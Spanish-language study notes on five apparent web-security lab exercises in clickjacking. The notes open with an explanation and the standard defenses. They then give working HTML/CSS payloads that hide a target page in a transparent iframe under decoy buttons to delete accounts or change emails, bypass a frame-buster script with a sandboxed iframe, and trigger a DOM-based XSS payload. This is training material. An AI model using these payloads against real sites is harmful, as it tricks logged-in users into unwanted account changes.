------
### QUE ES?
El **Clickjacking** es una vulnerabilidad web donde un atacante engaña al usuario para que haga clic en algo diferente a lo que cree estar pulsando.
Ocurre cuando una página maliciosa carga otra web legítima dentro de un **iframe invisible o transparente**, superponiendo botones falsos encima.  
La víctima piensa que está haciendo una acción inocente, pero en realidad está interactuando con la web legítima (por ejemplo, cambiar contraseña, activar algo, dar permisos, etc.).
Permite cosas como:
- Cambiar configuraciones sin que el usuario lo note
- Activar permisos (cámara, micrófono, notificaciones)
- Modificar datos de cuenta si está autenticado
Se previene usando:
- `X-Frame-Options` (DENY o SAMEORIGIN)
- `Content-Security-Policy: frame-ancestors`
- Protección anti-CSRF como defensa adicional
#### PASOS: 
- *REVISAR BOTON DE BORRAR CUENTA*
- *REVISAR SI SE REFLEJA NUESTRO INPUT EN EL DOM*
### LAB1: BASIC CLICKJACKING WITH CSRF TOKEN PROTECTION
Hay una acción sensible (p.ej. **Delete account**) que está protegida con **CSRF token**.  
Aun así, si la página **se puede cargar dentro de un iframe** (no hay `X-Frame-Options` / `CSP frame-ancestors`), podemos hacer **clickjacking**: engañamos al usuario para que haga clic en el botón real dentro del iframe.
**Idea clave:** aquí **no “bypasseamos” el CSRF token**. El usuario ya está logueado y el formulario dentro del iframe ya incluye **un token válido** para su sesión; el usuario lo envía sin darse cuenta al hacer clic.
`<style>
`    iframe {
`        position:relative;
`        width:500px;
`        height:700px;
`        opacity:0.00001;
`        z-index: 2;
`    }
`    div {
`        position:absolute;
`        top:560px;
`        left:60px;
`        z-index: 1;
`    }
`</style>
`<div>click</div>
`<iframe src="LAB-ID/my-account"></iframe>
### LAB2: CLICKJACKING WITH FORM INPUT DATA PREFILLED FROM A URL PARAMETER
Aquí la acción sensible es **cambiar el email**, y además el valor del email se puede **pre-rellenar desde un parámetro en la URL** (`?email=...`).  
**Idea clave:** el parámetro prepara el dato, y el clickjacking fuerza el “submit” mediante el clic del usuario (que está autenticado).
`<style>
`     iframe {
`         position:relative;
`         width:500px;
`         height:700px;
`         opacity:0.1;
`         z-index:2;
`     }
`     div {
`         position:absolute;
`         top:510px;
`         left:60px;
`         z-index:1;
`     }
`</style>
`<div>Click me</div>
`<iframe src="ID-LAB/my-account/?email=pwned@pwned.com"></iframe>
### LAB3: CLICKJACKING WITH A FRAME BUSTER SCRIPT
Vemos que la aplicación intenta protegerse contra clickjacking mediante un **frame buster en JavaScript**:

`if(top != self) {  
`    window.addEventListener("DOMContentLoaded", function() {  
`        document.body.innerHTML = 'This page cannot be framed';  
`    }, false);  
Que hace:
- Comprueba si la página está dentro de un iframe → Si la condición es verdadera, significa que la página está embebida.
- Cuando el DOM termina de cargar → Se elimina todo el contenido del body.
Pero podemos bypassearlo cargando la página en un `<iframe sandbox="allow-forms">`, lo que impide que se ejecute el JavaScript del frame buster y evita que el DOM sea borrado.
`allow-forms` permite que los formularios se envíen dentro del iframe, aunque los scripts estén bloqueados por el sandbox.

`<style>
`    iframe {
`        position:relative;
`        width:500px;
`        height:700px;
`        opacity:0.1;
`        z-index:2;
`    }
`    div {
`        position:absolute;
`        top:490px;
`        left:60px;
`        z-index:1;
`    }
`</style>
`<div>Click me</div>
`<iframe sandbox="allow-forms" src="LAB-ID/my-account?email=pwned@pwned.com"></iframe>
### LAB4: EXPLOITING CLICKJACKING TO TRIGGER DOM-BASED XSS
En este laboratorio existe una vulnerabilidad **DOM-based XSS** en la página de feedback.  
El parámetros *name* de la URL se refleja en el DOM sin sanitización adecuada.

`<style>
`    iframe {
`        position:relative;
`        width:500px;
`        height:1000px;
`        opacity:0.1;
`        z-index:2;
`    }
`    div {
`        position:absolute;
`        top:880px;
`        left:60px;
`        z-index:1;
`    }
`</style>
`<div>Click me</div>
`<iframe src="LAB-ID/feedback?name=<img src=1 onerror=print()>&email=pwned@pwned.com&subject=test&message=test#feedbackResult"></iframe>
### LAB5: MULTISTEP CLICKJACKING
En este laboratorio la acción sensible no se completa con un solo clic. La aplicación requiere una secuencia de interacción.
`<style>
`    iframe {
`        position:relative;
`        width:500px;
`        height:700px;
`        opacity:0.1;
`        z-index:2;
`    }
`    .firstClick, .secondClick{
`        position:absolute;
`        top:500px;
`        left:60px;
`        z-index:1;
`    }
`    .secondClick{
`        top:300px;
`        left:180px;
`    }
`</style>
`<div class="firstClick">Click me first</div>
`<div class="secondClick">Click me next</div>
`<iframe src="LAB-ID/my-account"></iframe>